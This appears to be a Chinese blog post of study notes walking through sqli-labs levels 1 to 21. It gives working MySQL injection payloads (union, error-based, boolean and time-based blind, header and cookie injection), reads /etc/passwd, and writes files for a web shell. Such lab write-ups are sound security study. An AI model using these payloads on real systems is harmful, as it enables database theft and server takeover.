---

layout: post

title: "SQL注入   sqli-lab 1-20"

author: "markt"

---



## 基础知识

- [mysql字符串相关函数](https://justdo2008.iteye.com/blog/1141609)

- 字符串连接函数group_concat() 与concat()：返回多列时用前者，一行时用后者，简单理解就是：

  `select group_concat(user,password) from users  == select concat(user,password) from users limit 1`

- 字符串分割函数substring(),substr(),left(),right(),mid()：

- 字符串与ASCII码互转函数ascii(),char():

- if(exp1,exp2,exp3): 如果exp1成立则返回exp2否则返回exp3；

- benchmark(10,exp1):把exp1执行10次，一般执行计算量比较大的比如sha(1),md5(1)；

- 文件读写函数：

  - `select 1 into outfile '/tmp/1.txt'  /  select 1 into dumpfile '/tmp/1.txt'`
  - `select load_file('/etc/passwd')`

### lv.1

`id=1' limit 0 union select 1,2,group_concat(schema_name) from information_schema.schemata -- `

简单的union联合注入，手工一步步即可拿到所有数据

| select      | from                        | where          |
| ----------- | --------------------------- | -------------- |
| schema_name | information_schema.schemata |                |
| table_name  | information_schema.tables   | table_schema = |
| column_name | information_schema.columns  | table_name =   |

### lv.2

字符型注入：`sql = 'select * from user where id = "' + get_id+'"'` （ lv.1）

数字型注入：`sql = 'select * from user where id = ' + get_id` ( lv.2 )

id=1111 union select 1,group_concat(username),group_concat(password) from users # 

### lv.3

`id=1') or 1=1 -- `

将id先代入sql，再在数据库中对其执行函数。类似：`sql = 'select * from user where id = int("' + get_id + '")'` 

### lv.4

`id=1") or 1=1 -- `

类似第三关，只不过只过滤了`'`而忘了过滤`"`

### lv.5

`http://192.168.145.129:8888/Less-5/?id=1' and (length((select group_concat(id,username,password) from users))) = 192 -- `

最简单的盲注，一般都是用脚本一个字节一个字节跑出来

### lv.6

`http://192.168.145.129:8888/Less-6/?id=1" and (length((select group_concat(id,username,password) from users))) = 192 -- `

同lv.5，只不过需要闭合的由双引号变为单引号

### lv.5 & lv.6 预期解：双查询注入

`http://192.168.145.129:8888/Less-5/?id=1' union select 1,count(*),concat(floor(rand(0)*2),' ',(select concat(id,username,password) from users limit 1)) as a from information_schema.tables group by a -- `

参考链接：[SQL注入：双查询](https://lyiang.wordpress.com/2015/04/06/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%8F%8C%E6%9F%A5%E8%AF%A2/) / [Mysql报错注入原理分析(count()、rand()、group by)](https://www.cnblogs.com/xdans/p/5412468.html)

简单来说就是利用floor(rand(0)*2)在聚合函数中的不确定性使得作为子查询的payload以报错的形式返回，通常利用语句为

`union select 1 from ( select count(*),concat(floor(rand(0)*2),( 注入爆数据语句)) as a from information_schema.tables group by a) as b`

这里的子查询是放在from语句中的，除此之外还可以放入select或者where中，而除此之外还发现了其他的基于报错的子查询注入：

`http://192.168.145.129:8888/Less-1/?id=221' union select 1,2,3 from (select 猜测的列名 from security（已知的数据库）.猜测的表名) as b -- `

在这个子查询中会先后判断表名和列名，不存在则会报错，所以可以根据报错得到数据库的结构。不存在的报错分别如下:

`Table 'securitsy.wusers' doesn't exist ` , `Unknown column 'ids' in 'field list'`

### lv.7

`http://192.168.145.129:8888/Less-7/?id=1')) union select id,username,password from users into outfile '/var/www/html/tmp/1234.txt' -- `

简单的文件写入，一般用于写shell进去，前提：1.数据库和服务器在同一机器上；2.读写权限：secure-file-pri （限制读写的目录），文件写入目录的写权限以及用于执行shell的执行权限

小问题：如何判断需要`'))'`才能将id参数闭合？

### lv.8

`http://192.168.145.129:8888/Less-8/?id=1' and if('e'=substr((select database()),2,1),1,2)=1 -- `

预期是布尔型盲注，实现的方式很多：

- `http://192.168.145.129:8888/Less-8/?id=1' and ascii(substr((select database()),1,1))=116 --  `

说起来能够判断条件的地方都有盲注的可能，前提是能根据页面的返回判断payload的执行情况。

### lv.9

`http://192.168.145.129:8888/Less-9/?id=1' and (select sleep(3)) and (select database()) ='security' -- `

基于时间的盲注，一般思路有两个，即使用sleep（）函数来使系统延迟返回，或者是通过大量计算主动延长系统的返回时间，即使用`benchmark(100,sha(1))`。

### lv.10

`http://192.168.145.129:8888/Less-10/?id=1" and sleep(2) and 'security'=(select database()) -- `

同上，只不过是换成了需要闭合双引号。

### lv.11

`POST: uname=a' union select 1,group_concat(id,username) from users -- &passwd= `

POST注入，换个方式而已，当确保你能成功POST出去的时候就和GET没区别了。

### lv.12

`POST: uname=a&passwd=a") union select 1,group_concat(id,username) from users -- `

换成双引号，然后注入的地方改成了密码，多试就行了。耐心啊朋友！

> 另外，并不是注入点换到了密码，都能注入只是你又菜又粗心因为一个简单的括号闭合就没测出来。我说咋还能同一个语句只有后半句能注入呢。

### lv.13

`POST: uname=admin') and 'security'=(select database()) -- &passwd=a`

没啥变化，变成了基于报错的注入了，找个条件判断的地方就随便注，顺道复习一下之前的双查询注入：

`POST: uname=admin') union select count(*),concat(floor(rand(0)*2),' ',(select 123123)) as a from users group by a -- &passwd=`

### lv.14

`POST: uname=a" or 1=1 and (sleep(0.1)) union select 1,2 -- &passwd=d  `

变成了双引号闭合，其他似乎没变化？（确实没变化）之前lv13的都可以直接用，不管是报错还是基于双查询注入的，不知道预期解之前，复习一下延时注入吧。

> 看起来双查询注入是报错注入的一种优化，将后者只能根据报错用payload逐位判断数据变成了可以一行一行判断。

### lv.15

`POST: a' or 1=1 and not (select sleep(0.1)) -- `

又变回单引号了，但是没了报错，所以第一反应就是延时注入，这里应该注意，sleep（）函数返回0而不是1 。

另外，Firefox的注入插件不怎么支持单双引号，POST不出去；自己用requests库写的脚本sleep函数参数不能太高。

### lv.16

`POST: a") or 1=1 and not (select sleep(0.1)) -- `

和lv15一样，只不过换成双引号加了个闭合的括号。耐心啊朋友！

### lv.17

`POST: passwd=d' or (select 1 from (select count(*),concat(floor(rand(0)*2),(select database())) as a from information_schema.tables group by a ) as b) -- `

简单猜的语句是`update users set password = $passwd where username = $uname ;`，但是没想到对username做了过滤。

看了源码发现是基于报错，所以就不用说了，能执行的地方就都可以注入，另外可以试一下延时注入，应该也可以。

### lv.18

`User-Agent :asd','ad',(select 1 from (select count(*),concat(floor(rand(0)*2),(select database())) as a from information_schema.tables group by a) as b ) ) --  d` 

利用注入insert语句，根据双查询注入的报错得到数据库信息。说到底还就是个闭合然后利用报错的注入，只不过位置在header里面罢了。

原插入语句如下：

`$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";`

### lv.19

`Referer:http://192.168.145.129:8888/Less-19/d',(select group_concat(schema_name) from information_schema.schemata where if((select database())='security',sleep(1),9)=0)) -- d`

和上面的lv.18一模一样，只不过换成了referer而已，这里采用非预期的延时注入，效果还是一样的。

18和19的关键点在于，如果没有提示，是否能自己找到header中的注入点。

### lv.20

`Cookie=uname=admind' union select 1,2,group_concat(schema_name) from information_schema.schemata -- d`

注入点又换到了cookie中，没别的，查询结果直接在页面返回了，直接union就可以。另外报错也有返回，可以尝试基于报错的注入。

复习其他方法：

`uname=admind' or 1=1 and 101=ascii(substring((select database()),2,1)) limit 1 -- d`

`uname=admind' union select 1,2,3 from (select count(*),concat(floor(rand(0)*2),(select database())) as a from information_schema.tables group by a  ) as b -- d`

`uname=admind' or 1=1 and if((select database())='security',benchmark(111000000,sha(1)),0)=0 limit 1 -- d`

### lv.21

`uname=YWRtaW5kJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIC0tIGRg`

相较于上一关，需要闭合的多了一个括号，并且把整个字符串base64加密了，除了麻烦点以外没啥别的，不过说起来更符合实际场景。

SQL注入基础部分就先到这里吧。简单总结一下手法：

|                            | 适用于                                 | payload                                                      |
| :------------------------- | -------------------------------------- | ------------------------------------------------------------ |
| union 联合                 | 将查询结果直接返回页面没有任何过滤     | `union select user()`                                        |
| 报错注入（最好双查询注入） | 页面返回报错语句                       | `union select 1 from (select count(*),concat(floor(rand(0)*2),(select user())) as a from information_schema.tables group by a) as b` |
| 盲注                       | 没有返回报错，查询结果被限制在页面输出 | `and 0 = if('security'=(select database()),sleep(1),0)`    or    `and 0 = if('security'=(select database()),benchmark(100000,sha(1)),0)` |
| 布尔型                     | 页面只有两种返回情况                   | `and 'e'=substr((select database()),23,1) -- `               |

不全，因为只列了刚真正学到的，其他太简单或者太复杂的就，再说吧。

> 先判断能不能闭合(`id=1'`)或者增加条件判断(`id=1' and 1=1`)，看看有无报错；如果没报错先看看能不能在返回页面把数据爆出来，再看看能不能根据页面返回的情况判断payload是否执行，后者即进入了盲注的区域。不论是延时注入还是基于布尔型的判断，只要能判断payload是否执行就存在注入。而如果页面如果极其明显的正确payload和错误payload都返回同样的页面则可以尝试延时注入。